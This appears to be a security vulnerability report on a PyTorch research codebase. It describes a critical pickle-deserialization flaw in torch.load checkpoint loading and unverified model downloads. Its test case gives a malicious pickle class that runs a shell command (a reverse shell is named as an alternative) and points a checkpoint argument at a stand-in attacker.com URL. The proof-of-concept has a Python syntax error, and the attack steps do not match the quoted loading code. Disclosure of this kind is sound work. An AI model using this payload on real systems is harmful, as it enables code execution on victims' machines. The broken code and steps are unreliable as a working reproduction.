### Vulnerability List

- **Vulnerability Name:** Pickle Deserialization leading to Remote Code Execution
- **Description:**
    1. The `load` functions in `detection/model.py` and `classification/model.py` use `torch.load` to load model checkpoints from user-specified paths (`load_ckpt_paths`, `visual_encoder_ckpt_path`, `pretrained_ckpt_name`).
    2. `torch.load` in PyTorch is vulnerable to pickle deserialization attacks when loading untrusted data. If a malicious actor crafts a pickled file containing malicious code and makes it available at a URL or a path that a researcher might use, they can achieve arbitrary code execution.
    3. The `scripts/download_models.sh` script downloads pretrained models from Google Cloud Storage (`https://storage.googleapis.com/graph_distillation/ckpt/`). While currently hosted on a legitimate Google Cloud Storage bucket, this script encourages users to download and use pretrained models.
    4. If an attacker can compromise the Google Cloud Storage bucket (or a mirror/copy of the models), or trick a user into downloading a malicious model from a different location (e.g., through a man-in-the-middle attack or social engineering), the researcher will unknowingly execute the malicious code when loading the model using the provided scripts or by manually specifying the path to the malicious model.
    5. The training and testing scripts (`scripts/train_*.sh`, `scripts/test_*.sh`) utilize command-line arguments like `--load_ckpt_path` and `--visual_encoder_ckpt_path`, which can be pointed to a malicious checkpoint file.
- **Impact:** Arbitrary code execution on the researcher's machine. This can lead to:
    - Data exfiltration: Sensitive research data, credentials, or personal files could be stolen.
    - System compromise: The attacker could gain full control of the researcher's machine, install backdoors, or use it for further attacks.
    - Research disruption: The researcher's work could be sabotaged, models corrupted, or experiments manipulated.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:**
    - None. The code directly uses `torch.load` without any input validation or security checks on the checkpoint files.
- **Missing Mitigations:**
    - **Input validation:** Implement checks to ensure that the provided checkpoint paths are within expected directories and potentially verify the integrity of the downloaded files (e.g., using checksums).
    - **Secure model loading:** Explore safer alternatives to `torch.load` for loading models, if available, or implement sandboxing/isolation techniques when loading models from untrusted sources.
    - **User warnings:** Clearly warn users about the risks of downloading and using pretrained models from untrusted sources in the README and documentation. Recommend verifying the source and integrity of downloaded models.
- **Preconditions:**
    1. A researcher downloads and uses the provided code.
    2. The researcher attempts to load a pretrained model, either by using the `download_models.sh` script and then using the training/testing scripts, or by manually providing a checkpoint path.
    3. A malicious actor has successfully placed a maliciously crafted PyTorch checkpoint file at a location accessible to the researcher, either by compromising the original download source or by tricking the researcher into using a different, malicious source.
- **Source Code Analysis:**
    - **`detection/model.py` and `classification/model.py` - Model Loading Functions:**
        - Both `BaseModel` classes in `detection/model.py` and `classification/model.py` have a `load` method.
        - These `load` methods use `torch.load(path)` to load the state dictionaries of the models.
        - `detection/model.py` `load` function:
          ```python
          def load(self, load_ckpt_paths, options, epoch=200):
              """Load checkpoints.
              """
              assert len(load_ckpt_paths) == len(self.embeds)
              for i in range(len(self.embeds)):
                  ckpt_path = load_ckpt_paths[i]
                  load_opt = options[i]
                  if len(ckpt_path) == 0:
                      utils.info('{}: training from scratch'.format(self.modalities[i]))
                      continue

                  if load_opt == 0:  # load teacher model (visual + sequence)
                      path = os.path.join(ckpt_path, 'embed_{}.pth'.format(epoch))
                      ckpt = torch.load(path) # Vulnerable line
                      try:
                          self.embeds[i].load_state_dict(ckpt)
                      except:
                          utils.warn('Check that the "modalities" argument is correct.')
                          exit(0)
                      utils.info('{}: ckpt {} loaded'.format(self.modalities[i], path))
                  elif load_opt == 1:  # load pretrained visual encoder
                      ckpt = torch.load(ckpt_path) # Vulnerable line
                      # ... (rest of the code)
          ```
        - `classification/model.py` `load` function:
          ```python
          def load(self, load_ckpt_paths, epoch=200):
              """Load trained models."""
              assert len(load_ckpt_paths) == len(self.embeds)
              for i, ckpt_path in enumerate(load_ckpt_paths):
                  if len(ckpt_path) > 0:
                      path = os.path.join(ckpt_path, 'embed_{}.pth'.format(epoch))
                      self.embeds[i].load_state_dict(torch.load(path)) # Vulnerable line
                      utils.info('{}: ckpt {} loaded'.format(self.modalities[i], path))
                  else:
                      utils.info('{}: training from scratch'.format(self.modalities[i]))
          ```
        - In both cases, `torch.load(path)` is directly used to load the checkpoint file specified by `path`, which is derived from user-provided paths (`load_ckpt_paths`, `visual_encoder_ckpt_path`).

    - **`scripts/download_models.sh` - Model Download Script:**
        - This script uses `wget` to download zipped checkpoint files from `https://storage.googleapis.com/graph_distillation/ckpt/`.
        - After downloading, these checkpoints are used by the training and testing scripts.
        - While the current source is a Google Cloud Storage bucket, there is no verification of the downloaded files' integrity.
        ```bash
        wget https://storage.googleapis.com/graph_distillation/ckpt/ntu-rgbd/depth.zip
        wget https://storage.googleapis.com/graph_distillation/ckpt/ntu-rgbd/jjd.zip
        # ... (rest of the download commands)
        ```

    - **`detection/run.py` and `classification/run.py` - Training/Testing Scripts:**
        - These scripts use `argparse` to handle command-line arguments, including checkpoint paths:
            - `--ckpt_path`: Base checkpoint path.
            - `--load_ckpt_path`: Checkpoint path to load for testing.
            - `--visual_encoder_ckpt_path`: Classification checkpoint to initialize visual encoder weights.
            - `--pretrained_ckpt_name`: Name of the teacher detection models.
        - These arguments allow users to specify the paths from which models are loaded, making the application vulnerable if a user is tricked into providing a path to a malicious checkpoint.

- **Security Test Case:**
    1. **Setup:**
        - Attacker creates a malicious PyTorch checkpoint file (`malicious_ckpt.pth`) using pickle, embedding code to execute (e.g., reverse shell, or simply writing a file to `/tmp/pwned`).
        ```python
        import torch
        import pickle
        import subprocess

        class Malicious(object):
            def __reduce__(self):
                cmd = ('touch /tmp/pwned') # Or reverse shell command
                return (subprocess.Popen, (cmd,shell=True,))

        torch.save({'state_dict': None, 'malicious_code': Malicious()}, 'malicious_ckpt.pth')
        ```
    2. **Deployment:**
        - Attacker hosts this `malicious_ckpt.pth` file on a publicly accessible web server or cloud storage (e.g., `https://attacker.com/malicious_ckpt.pth`).
    3. **Victim Action:**
        - Researcher downloads the project code and sets up the environment as described in the README.
        - Researcher modifies one of the test scripts (e.g., `scripts/test_ntu_rgbd.sh`) to use the malicious checkpoint by changing the `--load_ckpt_path` argument to point to the attacker's hosted file:
        ```bash
        python -m classification.run \
          --gpus 0 \
          --split test \
          --dset ntu-rgbd \
          --load_ckpt_path https://attacker.com/malicious_ckpt.pth \  # Malicious path
          --modalities rgb
        ```
        - Researcher executes the modified script: `sh scripts/test_ntu_rgbd.sh`.
    4. **Verification:**
        - After running the script, the attacker verifies if the malicious code was executed on the researcher's machine. For example, checks if the file `/tmp/pwned` exists, or if a reverse shell connection was established.

This test case demonstrates how an attacker can leverage the pickle deserialization vulnerability in `torch.load` to achieve arbitrary code execution by providing a malicious checkpoint file through the `--load_ckpt_path` argument.